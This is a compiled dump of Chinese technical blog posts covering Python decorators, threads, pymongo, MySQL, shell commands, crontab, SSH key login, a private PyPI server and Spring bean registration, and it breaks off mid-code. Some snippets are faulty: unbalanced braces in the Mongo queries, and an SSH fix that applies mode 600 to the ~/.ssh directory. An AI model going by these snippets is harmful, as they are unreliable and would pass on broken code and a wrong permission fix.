通过装饰器模式来统计方法的执行耗时 1234567891011121314151617181920212223242526272829303132333435363738import functoolsimport time## 统计方法执行时间print('----------------------- time start -----------------')def metric(func): @functools.wraps(func) def wrapper(*args, **kw): start = time.time() try: return func(*args, **kw) finally: end = time.time() print('%s() execute cost: %f() s' % (func.__name__, (end - start))) return wrapper@metricdef timeCal(): try: print('time cal now!') time.sleep(1) except InterruptedError as e: print(e) return 'hello world'print('res', timeCal())try: time.sleep(2)except InterruptedError as e: print(e)print('----------------------- time over -----------------') 看下上面的metric方法，就是具体的装饰器实现方式，在需要引用的函数上面加上 @metric 即可了；需要额外注意的是在metric函数内部的wrapper函数上，多加了一行`@functools.wraps(func)，主要是针对直接使用metric(timeCall)的调用方式时，返回的函数的签名依然为timeCall`，具体相关逻辑，参考: python教程之装饰器 上面执行结果的输出如下 12345----------------------- time start -----------------time cal now!timeCal() execute cost: 1.004160() msres hello world----------------------- time over ----------------- 实例2： 打印函数执行的日志（如常见的提供rpc服务，输出函数执行时的请求参数和返回结果）, 我们现在考虑这个装饰器可以自主选择是否传参的case 看下面装饰器的具体实现中，首先是判断logger参数，如果是函数方式，则表示注解上没有额外参数，因此返回的是 decorate(prefix)；否则返回decorate，两者之间的区别就是一个传参层级的问题 123456789101112131415161718192021222324252627282930313233343536373839## logger 方法print('----------------------- logger start -----------------')def logger(prefix): def decorate(func): @functools.wraps(func) def wrapper(*args, **kw): if not hasattr(prefix, '__call__'): print(\"prefix %s() req %s(), %s(): \" % (prefix, args, kw)) else: print(\"method %s() req %s(), %s(): \" % (func.__name__, args, kw)) return func(*args, **kw) return wrapper # 如果logger没有传参，则直接走if逻辑 if hasattr(prefix, '__call__'): return decorate(prefix) else: return decorate@logger('selfCal')def selfCal(): print('cal1....')@loggerdef selfCal2(text): print('cal2....', text)selfCal()selfCal2(\"2222\")print('----------------------- logger end -----------------') II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/16/181116-Python函数特性/"},{"title":"181117-Python线程与协程","text":"本篇博文主要介绍python中线程与协程的简单使用姿势 1. 线程线程，在使用之前需要先引入 threading 模块，基本的使用方式比较简单 123456789101112131415import randomimport threadingfrom threading import Threaddef cal(): print('print cal %s' % threading.current_thread().name)# 创建一个子线程t = threading.Thread(target=cal, name='testThread')# 执行t.start()t.join()print(\"over\") 使用线程的三步骤： 创建线程 threading.Thread(target=cal, name='testThread') 执行线程 t.start() 等待线程执行完毕 t.join() 如果需要获取线程执行之后返回的结果，改怎么办？这个时候就需要简单的封装一下，因为Thread.join默认是没有返回值的，但是我们可以通过继承Thread类来实现 123456789101112131415161718192021222324252627import randomimport threadingfrom threading import Threadclass MyThread(threading.Thread): def __init__(self, group=None, target=None, name=None, args=(), kwargs=None, *, daemon=None): Thread.__init__(self, group, target, name, args, kwargs, daemon=daemon) self._return = None def run(self): if self._target is not None: self._return = self._target(*self._args, **self._kwargs) def join(self): Thread.join(self) return self._returndef cal(): print('print cal %s' % threading.current_thread().name) return random.random() * 10t = MyThread(target=cal, name=\"newTestThread\")t.start()ans = t.join()print(\"out\", ans) 2. 协程比线程更优的实现方式，没实际使用过，先拿一个case放着，后面再说 123456789101112131415161718192021def consumer(): r = &apos;&apos; while True: n = yield r if not n: return print(&apos;[CONSUMER] Consuming %s...&apos; % n) r = &apos;200 OK&apos;def produce(c): c.send(None) n = 0 while n &lt; 5: n = n + 1 print(&apos;[PRODUCER] Producing %s...&apos; % n) r = c.send(n) print(&apos;[PRODUCER] Consumer return: %s&apos; % r) c.close()c = consumer()produce(c) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/17/181117-Python线程与协程/"},{"title":"181203-Python之Mongo基本使用姿势","text":"借助pymongo实现mongo的基本操作 1. 引入依赖12import pymongofrom pymongo import MongoClient 2. 建立连接开始第一步就是连接mongodb，有两种常见的连接方式 方式一 12uri = \"mongodb://user:password@localhost:port/the_database?authMechanism=SCRAM-SHA-1\"client = MongoClient(uri) 方式二 123456client = MongoClient('localhost', port = 27017, username='user', password='password', authSource='the_database', authMechanism='SCRAM-SHA-1') 说明 MongoDB 3.0（对应pymongo2.8）之后默认使用“SCRAM-SHA-1”加解密；之前使用的是“MONGODB-CR”，可以使用authMechanism指定；同时可以使用authSource指定应用加解密的database，默认是admin。 3. 获取db指定操作的db，然后接下来就可以对db中的集合进行操作 12db = client['db_name']# db = client.db_name # 也可以 4. 集合操作a. 插入数据123456789import datetimepost = {\"author\": \"Mike\", \"text\": \"My first blog post!\", \"count\": 12345, \"tags\": [\"mongodb\", \"python\", \"pymongo\"], \"date\": datetime.datetime.utcnow()}post_id = db['test_collection'].insert_one(post).inserted_id 上面这个每执行一次，插入一个document，对于批量插入，可以使用 insert_many 函数，传入一个列表的参数即可 b. 查询利用 find_one 查找一条匹配的文档 12record = db['test_collection'].find_one()print(record) 如果需要排除查询文档中某些字段，可以通过设置field的值为0， 12record = db['test_collection'].find_one({}, {\"_id\": 0})print(record) 根据查询条件进行检索，可以如下使用 12record = db['test_collection'].find_one({\"author\": \"Mike\"}, {\"_id\": 0})print(record) or查询 第一个参数，可以使用 { '$or': [ 查询条件, 查询条件 ] } 12record = db['test_collection'].find_one({'$or': [{\"author\": \"Mike\"}, {\"author\": \"Jake\"}], {\"_id\": 0})print(record) and与or查询 字典中的不同的key组合就是and，基本语法为 db.col.find({key1:value1, key2:value2}).pretty() 12record = db['test_collection'].find_one({count: 12345, '$or': [{\"author\": \"Mike\"}, {\"author\": \"Jake\"}], {\"_id\": 0})print(record) 数字比较 不同于mysql直接使用符号，对于比较会用形如$lt的符号来代替 操作 格式 实例 等效sql 等于 {key: value} db['test_collection].find_one({'count': 123}) count=123 小于 {key: {'$lt': value}} db['test_collection].find_one({'count': {'$lt': 123} }) count&lt;123 小于或等于 {key: {'$lte': value}} db['test_collection].find_one({'count': {'$lte': 123} }) count&lt;=123 大于 {key: {'$gt': value}} db['test_collection].find_one({'count': {'$gt': 123} }) count&gt;123 大于或等于 {key: {'$gte': value}} db['test_collection].find_one({'count': {'$gte': 123} }) count&gt;=123 不等于 {key: {'$ne': value}} db['test_collection].find_one({'count': {'$ne': 123} }) count!=123 c. 更新更新提供了两种方式，一个是增量更新，一个是覆盖更新 增量更新update 语法定义如下 1234567db.collection.update( &lt;query&gt;, # 查询条件 &lt;update&gt;, # 更新的值 { upsert: &lt;boolean&gt; # 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入 }) 一个实际的更新case 1mycol.update_one({'author': 'Mike'}, {'$set': { 'text': 'hello', 'date': datetime.datetime.now()}}) 覆盖更新save 语法定义如下 1db.collection.save({document}) 这个表示用document的内容来替换已有文档，从接口签名上来看，不推荐使用这种方式 d. 删除和查询的使用方式差不多，只不过最终的效果是删除而已 1db.collection.delete_one({query}) 实例如下 1mycol.delete_one({'author': 'Mike'}) II. 其他0. 参考 PyMongo 3.7.2 documentation MongoDB教程 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/12/03/181203-Python之Mongo基本使用姿势/"},{"title":"181114-Python高级特性","text":"python的一些高级特性记录小结，主要就是列表生成是和生成器的使用姿势 1. 列表生成式如何快速的生成一个1,20的列表? 12&gt;&gt;&gt; list(range(1,20))[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] 如何生成 [1*1,2*2,...] 格式的列表? 12&gt;&gt;&gt; [ x*x for x in range(1,10)][1, 4, 9, 16, 25, 36, 49, 64, 81] 针对上面的列表再做一个小的限制，排除掉5*5这个，如何处理？ 12&gt;&gt;&gt; list(x * x for x in range(1,10) if x!=5)[1, 4, 9, 16, 36, 49, 64, 81] 简单来看下这个列表生成式规则，其实和jdk8中的lambda比较类似 1元素的操作 for x in 列表 条件过滤 进阶版 多个列表式合在一起，组成多维数组遍历的效果 12&gt;&gt;&gt; list(x * y for x in range(1, 5) for y in range(2, 6))[2, 3, 4, 5, 4, 6, 8, 10, 6, 9, 12, 15, 8, 12, 16, 20] 上面的结果等同于 1234567&gt;&gt;&gt; ans=[]&gt;&gt;&gt; for x in range(1, 5):... for y in range(2, 6):... ans.append(x*y)... &gt;&gt;&gt; ans[2, 3, 4, 5, 4, 6, 8, 10, 6, 9, 12, 15, 8, 12, 16, 20] 字典的遍历方式 1234&gt;&gt;&gt; d{'b': 23, 'cd': 12, 'd': 'add'}&gt;&gt;&gt; [k +\"=\" + str(v) for k,v in d.items()]['b=23', 'cd=12', 'd=add'] 2. 生成器这是个比较有意思的东西，之前没有接触过，相比较于函数而言，主要特点如下 函数是顺序执行，遇到return语句或者最后一行函数语句就返回。 而变成generator的函数，在每次调用next()的时候执行，遇到yield语句返回，再次执行时从上次返回的yield语句处继续执行。 基本定义 形如生成式的使用方式，将中括号改成圆括号即可 123456789&gt;&gt;&gt; f=(x*x for x in range(1, 3))&gt;&gt;&gt; next(f)1&gt;&gt;&gt; next(f)4&gt;&gt;&gt; next(f)Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;StopIteration yield定义方式 对于无法写成列表生成式的，可以通过yield来实现，如著名的斐波拉契数列 123456789101112131415## 定义斐波拉契数列生成的函数，注意下面的yield语句&gt;&gt;&gt; def fib(x):... a,b,n=0,1,0... while n &lt; x:... yield b... a,b=b,a+b... n+=1... return 'done'... ## 开始使用，直接用for循环迭代使用&gt;&gt;&gt; for v in fib(10):... print(v, end=' ')... 1 1 2 3 5 8 13 21 34 55 使用姿势 使用生成器，常见的除了for循环使用之外，另一个就是如迭代器的使用姿势next(f)；上面已经分别给出了使用的demo，注意下区别 针对next使用时，最后一个时，会抛出一个异常StopIteration 针对for循环使用时，无法获取函数的最终return结果 针对需要返回结果的case，下面给出while循环结合next的使用姿势进行演示如何处理 12345678910&gt;&gt;&gt; f=fib(6)&gt;&gt;&gt; while(True):... try:... x = next(f)... print(x, end=' ')... except StopIteration as e:... print('gen return', e.value)... break... 1 1 2 3 5 8 gen return done 小结 对于生成器而言，特别是yield方式，可以简单理解为每次在执行到yield的时候，直接退出函数的继续执行，并返回当前的结果； 当继续调用next时，从yield后面的代码继续执行，函数内所有的变量值都是上次的内容 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/14/181114-Python高级特性/"},{"title":"181208-mysql之给现有表新增自增字段","text":"I. 问题描述一张现有的表，没有自增主键，拿的是一串字符串作为的表的主键，实际使用来，并没有什么问题，但是在扫表的时候就不是特别的方便了， 因此希望给这张表新增一个自增的id 因为主键被占用了，所以只能新增一个唯一的自增字段, 可以按照基本的添加字段的方式来实现 1ALTER TABLE table_name ADD id INT(11) NOT NULL UNIQUE KEY AUTO_INCREMENT FIRST; 说明 上面的FIRST表示新增的字段放在最前面 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/12/08/181208-mysql之给现有表新增自增字段/"},{"title":"181129-mysql表锁死解决办法","text":"MySQL表修改频繁，导致表被锁死，悲催的表现时这个表完全没法继续使用了，查询，修改，删除都不能使用，这种场景下除了重启mysql服务之外还可以怎么处理？ 另外一种解决办法: 查看当前的操作process，然后找出锁表的那个进程，杀掉 12show full processlistkill xxx II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/29/181129-mysql表锁死解决办法/"},{"title":"180917-Shell命令之xargs使用小结","text":"Shell命令之xargs使用小结常见用于管道的处理中，拿到前面的数据进行后续的处理; xargs 以空白字符或换行作为分割，默认使用echo输出结果，且会忽略空白行，官方说明如下 xargs reads items from the standard input, delimited by blanks (which can be protected with double or single quotes or a backslash) or newlines, and executes the command (default is /bin/echo) one or more times with any initial-arguments followed by items read from standard input. Blank lines on the standard input are ignored. I. 使用说明1. 参数解释-0 将特殊字符当做一般字符处理，简单来说，空白不被忽略掉，如下 -a file 文件作为数据源，等同于 cat xxx.txt | xargs -n num 表示命令在执行的时候一次用的argument的个数 -p 操作具有可交互性，每次执行comand都交互式提示用户选择，当每次执行一个argument的时候询问一次用户 -t 表示先打印命令，然后再执行。 -I 替换，将前面的数据，一各一个的赋值给{}，后面使用者可以用{}来表示前面接收的数据 如批量修改文件后缀名 -L 从标准输入一次读取num行送给Command命令 ，-l和-L功能一样 -d 默认的xargs分隔符是回车，argument的分隔符是空格，这里修改的是xargs的分隔符 如下图，将默认的分隔符换成$ 2. 结合使用xargs命令通常是与其他的命令配套结合使用，下面给出几个常见的使用case a. 打印jvm堆栈信息jvm应用的id存在pid_file中，需要进行堆栈分析时，一行命令即可 1cat pid_file | xargs -I {} jstack {} | grep \"VM Periodic Task Thread\" 当然，如果需要关闭应用，也比较简单了 1cat pid_file | xargs -I {} kill -9 {} b. find查找配合find命令进行查找匹配也比较常见了，如查找文件并打印内容 1find ./ -name \\*.bak -type f -print | xargs -t -I {} cat {} 另外一个常见的就是匹配文本的内容 1find ./ -name \\*.bak -type f -print | xargs -t -I {} grep a {} -n II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/09/17/180917-Shell命令之xargs使用小结/"},{"title":"181220-Shell-目录遍历获取指定的文件","text":"遍历目录，获取需要的文件直接贴对应的实现脚本 123456cd /homefor dir in $(ls)do # 如果是目录，则打印目录名 [[ -d ${dir} ]] &amp;&amp; echo ${dir}done II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/12/20/181220-Shell-目录遍历获取指定的文件/"},{"title":"18年4月18日离杭小记","text":"&nbsp;&nbsp;&nbsp;&nbsp;从15年7月1日到18年4月18日，恍惚之间，来杭州已经度过1023天，将近三年的时光，有过满含激情充满朝气的时候，也有过浑浑噩噩每天无所事事的时候，这里是迈入社会的第一站，拉开了一段新的旅程序幕，于此驻足三年，却收益余生. &nbsp;&nbsp;&nbsp;&nbsp;这几天杭州的天气不错，阳光明媚，虽然能见度不怎么样，坐在蘑菇街大厦的11层，望向窗外，远处依然是雾蒙蒙的，没有蓝蓝的天，也看不到飘零的云，但就这么看着，也觉得有别样的风景。杭州，最忆是西湖。曾在古诗文中无数次憧憬着的人间天堂，依稀记得初次到西湖前的画面。粼粼的湖光、和煦的风，两条横插湖中的苏堤、白堤，却让我感受到完全不一样的风景。从没有想过，西湖会是这样的场景；和印象中《新白娘子传奇》里的小湖、断桥、微雨和油纸伞的水墨画完全不同；带上了浓厚的现代风之后的西湖，好像也只有那千古继承的湖波和岸边的依依杨柳，才是最出的风光，也才能给人更多的古韵遐想。 &nbsp;&nbsp;&nbsp;&nbsp;前两天，收拾了下行李，发现这几年来，增加的除了体重之外，还有那些零碎的东西。当初一个背包就来到这座陌生的城市，而现在再想一两个背包离开却没那么容易。各季的衣服，一些娱乐的玩具，当时信誓旦旦买来健身结果缺在角落吃灰的器材，还有哪些九成多新的各类书籍，七七八八的对扎在一起，却是颇为可观。又那么些东西，准备就这么舍去，却没有那么干脆，好歹这孤身的岁月中，它们终究是发挥了些许作用；话说直接扔掉，过于凉薄了些，当然最主要的原因还是荷包过于羞涩了。匆匆而来总是容易，想要匆匆而去，往往并没有那么干脆。 &nbsp;&nbsp;&nbsp;&nbsp;在杭州待了三年，仔细想想，对杭州这座城市的了解，好像并不太多。玩耍的地方，总是围绕着西湖展开。一年四季的西湖景色，有嫩牙初长成的初春时节风景；也有炎炎下一池荷叶碧波摇曳的酷暑夏日；还是喜欢秋日的荫凉，微风吹拂下的粼粼湖光，在水雾中朦朦胧胧的雷峰塔和飞来峰；当然也离不开被所有人津津乐道的断桥残雪。这些年，西湖边上演绎了多少故事，又迎来送往了多少代人呢。不知以后再次踏足，会是何年岁月。西湖边上的雷峰塔，飞来峰中的灵隐寺，龙井村里盘绕的茶园，西溪湿地的芦苇飞鸟，钱塘江上的滚滚潮水，想想这些景色风光，算不上绝色秀丽，却也别有一般风光。 &nbsp;&nbsp;&nbsp;&nbsp;很多年都没有写过东西了，笔也都不大会握，稍微写一会，手就酸的不行。除了思想会僵化，这手腕看来也不甘落后。想说些什么，然而却找不到什么主题。最终只化作简简单单的几个字，“匆匆而来，流连而去” by 一灰灰 | 2018.04.18","link":"/hexblog/2018/04/18/18年4月18日离杭小记/"},{"title":"181222-Centos SSH免密登录配置不生效问题fix","text":"centos添加ssh免密配置，结果发现登录时，依然要求设置密码，记录一下解决过程与最终的方案 I. ssh免密配置免密配置比较简单，自己的电脑上生成公私钥，然后将公钥丢上去即可 本机执行流程： 12345ssh-keygen# 一路回车，在home目录的.ssh下会生成两个文件cd ~/.ssh; ls# id_rsa 这个是生成的私钥# id_rsa.pub 这个是生成的公钥 接下来我们需要将id_rsa.pub的内容，粘贴到服务器的authorized_keys 12vim ~/.ssh/authorized_keys# 将上面的公钥内容拷贝进来，保存，退出即可 正常来讲，上面的逻辑执行完毕之后，就可以免密登录了，但是突然遇到了登录还是要密码的情况 原因定位 查看ssh的登录日志 1vi /var/log/secure 然后发现日志显示 12Dec 22 17:00:15 localhost sshd[21485]: Connection closed by xxx port xxx [preauth]Dec 22 17:01:15 localhost sshd[21528]: Authentication refused: bad ownership or modes for directory /home/xxx/.ssh 从上面的日志中看出，问题应该就在.ssh目录的权限上，添加上权限即可 1chmod 600 ~/.ssh II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/12/22/181222-Centos-SSH免密登录配置不生效问题fix/"},{"title":"190109-mysql 新增多列写法","text":"记录下同时新增多列的sql写法 1alter table table_name add (amount decimal(20,8) NOT NULL DEFAULT '0.00000000' COMMENT '数量' , price decimal(20,8) NOT NULL DEFAULT '0.00000000' COMMENT '价格'); 用圆括号包含起来即可 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/09/190109-mysql-新增多列写法/"},{"title":"180605-Linux下Crontab实现定时任务","text":"Linux下Crontab实现定时任务基于Hexo搭建的个人博客，是一种静态博客页面，每次新增博文或者修改，都需要重新的编译并发布到Github，这样操作就有点蛋疼了，一个想法就自然而然的来了，能不能每天2点，自动的build一下，然后上传 linux的Crontab正好可以支持，下面简单的记录下相关知识点 进入Crontab编辑 1crontabl -e 然后开始类vim方式的编辑，一个写法如下 130 02 * * * /bin/bash /home/yihui/hexblog/build.sh 上面的含义表示每天2:30分，执行一下脚本 /home/yihui/hexblog/build.sh 1. 语法分析针对上面的case进行语法简单说明 1minute hour day month week command minute： 表示分钟，可以是从0到59之间的任何整数。 hour：表示小时，可以是从0到23之间的任何整数。 day：表示日期，可以是从1到31之间的任何整数。 month：表示月份，可以是从1到12之间的任何整数。 week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。 command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。 2. 取值分析上面的时间，可以用具体的数字，也可以用一些符号表示，对应的含义如下 星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9” 中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6” 正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次，同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。 3. 服务操作1234/sbin/service crond start //启动服务/sbin/service crond stop //关闭服务/sbin/service crond restart //重启服务/sbin/service crond reload //重新载入配置 4. 常用命令编辑Crontab crontab -e 查看Crontab crontab -l 删除Crontab crontab -r 添加Crontab之后，可能并没有预期那样生效，有可能是Crontab服务没有启动 5. 实例case每个月第一天执行一次 1* * 1 * * /bin/bash xxx.sh 每分钟执行一次 1* * * * * /bin/bash xxx.sh 每小时的第15,30,45分钟执行 115,30,45 * * * * /bin/bash xxx.sh 每周五19:30执行发周报 130 19 * * 5 command 每小时清一下日志 1* */1 * * * command II. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/06/05/180605-Linux下Crontab实现定时任务/"},{"title":"190105-Python 搭建私服教程","text":"在python项目中，需要引入第三方的包，可以通过pip很简单的引入；但是有个问题，公司内部的包，也不能发布到pypi仓库吧，所以搭建自己的私服就很有必要了，下面介绍一下基于PypiServer搭建私服的教程 I. 搭建教程1. 安装方式首先确认我们的环境时Centos，python版本为3.7 安装命令比较简单，如下 1234pip install pypiserver# 下面指定python包存储的路径cd ~/mkdir -p python-repository/packages 上面完成之后，就可以开启私服了 1pypi-server -p 8080 -P . -a . ~/python-repository/packages 上面的 -P . -a . 表示我们开启的私服，不要求安全校验，可以直接下载和上传包 2. 安全校验上面的没有加安全限制，实际场景可能就不太合适了，如果我们要加上用户名/密码限制，可以如下配置 安装 htpasswd 12pip install passlibyum -y install httpd-tools 生成密码文件： 用户名+密码= user/pwd123456 1htpasswd -sc htpasswd.txt user 上面执行之后，会提示输入密码，完成之后，就over了 接下来，我们启动私服，需要修改一下启动命令，下面-a list表示上传，下载，查看包都需要校验 1pypi-server -P htpasswd.txt -a list -p 8888 ~/python-repository/packages 3. 使用说明前面的私服算是搭建完成了，接下来就是使用姿势了，对我们而言，需要关注的无非安装和发布两个操作了 发布包 首先设置配置文件，vim ~/.pypirc 12345678[distutils]index-servers = local[local]repository: http://127.0.0.1:8888username: userpassword: pwd123456 然后到需要上传的项目下，执行下面的命令即可 1python3.7 setup.py sdist upload -r local 安装包 我们通过pip进行包安装，默认是从pypi.org下载包，所以需要额外设置下从私服下包 设置配置文件: vim ~/.pip/pip.conf 123[global]extra-index-url = http://user:pwd123456@127.0.0.1:8888trusted-host = 127.0.0.1 其中 extra-index-url 的value 前面是用户名:密码，注意走的是http协议，因此需要在下面配置上信任host 上面配置完毕之后，下载包就可以和之前的操作一样了 1pip3.7 install demoPackage==1.0.0 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/05/190105-Python-搭建私服教程/"},{"title":"190114-beautifulsoup4版本不一致导致解析问题","text":"beautifulsoup4 这个用于解析html的包，不同版本的使用姿势问题，导致解析数据异常 新版 旧版 beautifulsoup4==4.7.1 beautifulsoup4==4.6.3 通过标签的class进行定位时，会自动删除空格 尊重原始的class，不会删除收尾的空格 一个实例，表明两个不同的版本中的写法 123&lt;div class=\"hello world \"&gt; hello world&lt;/div&gt; 对于 4.7.1 版，使用姿势应该如下，注意class中，去掉了末尾的空格 12soup = BeautifulSoup(coin_html, 'html.parser')address_table = soup.find(\"div\", attrs={'class', \"hello world\"}) 对于 4.6.3版，使用姿势则应该为 12soup = BeautifulSoup(coin_html, 'html.parser')address_table = soup.find(\"div\", attrs={'class', \"hello world \"}) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/14/190114-beautifulsoup4版本不一致导致解析问题/"},{"title":"190115-Shell目录下文件统计","text":"文件夹下文件的统计，通常用的是wc来做，下面简单小结一下各种case 1. 统计当前文件夹下文件个数1ls -l | grep \"^-\" | wc -l 2. 统计当前文件下目录的个数1ls -l | grep \"^d\" | wc -l 3. 统计当前文件夹及子文件夹下文件的个数1ls -lR | grep \"^-\" | wc -l 4. 统计当前文件夹及子文件夹下目录的个数1ls -lR | grep \"^d\" | wc -l 上面执行演示结果如下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/15/190115-Shell目录下文件统计/"},{"title":"180804-Spring之动态注册bean","text":"Spring之动态注册bean什么场景下，需要主动向Spring容器注册bean呢？ 如我之前做个的一个支持扫表的基础平台，使用者只需要添加基础配置 + Groovy任务，就可以丢到这个平台上面来运行了，而这个基础平台是一直都在运行的，所以在新来任务时，最直观需要注册的就是 DataSource 数据源这个bean了，那么可以怎么玩？ I. 主动注册Bean支持借助BeanDefinition来实现bean的定义，从最终的使用来看，代码比较少，几行而已 12345678910111213public &lt;T&gt; T registerBean(String name, Class&lt;T&gt; clazz, Object... args) { BeanDefinitionBuilder beanDefinitionBuilder = BeanDefinitionBuilder.genericBeanDefinition(clazz); if (args.length &gt; 0) { for (Object arg : args) { beanDefinitionBuilder.addConstructorArgValue(arg); } } BeanDefinition beanDefinition = beanDefinitionBuilder.getRawBeanDefinition(); BeanDefinitionRegistry beanFactory = (BeanDefinitionRegistry) applicationContext.getBeanFactory(); beanFactory.registerBeanDefinition(name, beanDefinition); return applicationContext.getBean(name, clazz);} 测试如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import com.github.hui.story.quickstory.server.VisitService;import lombok.ToString;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.config.BeanDefinition;import org.springframework.beans.factory.support.BeanDefinitionBuilder;import org.springframework.beans.factory.support.BeanDefinitionRegistry;import org.springframework.context.ConfigurableApplicationContext;import org.springframework.stereotype.Component;@Componentpublic class BeanHolder { private final ConfigurableApplicationContext applicationContext; public BeanHolder(ConfigurableApplicationContext applicationContext) { this.applicationContext = applicationContext; initSer(); } public void initSer() { InrSer ser = registerBean(\"test\", InrSer.class); ser.name = \"一灰\"; ser.uid = 22; System.out.println(ser); InrSer ser2 = registerBean(\"test2\", InrSer.class, \"一灰灰Blog\", 20); System.out.println(ser2); } @ToString public static 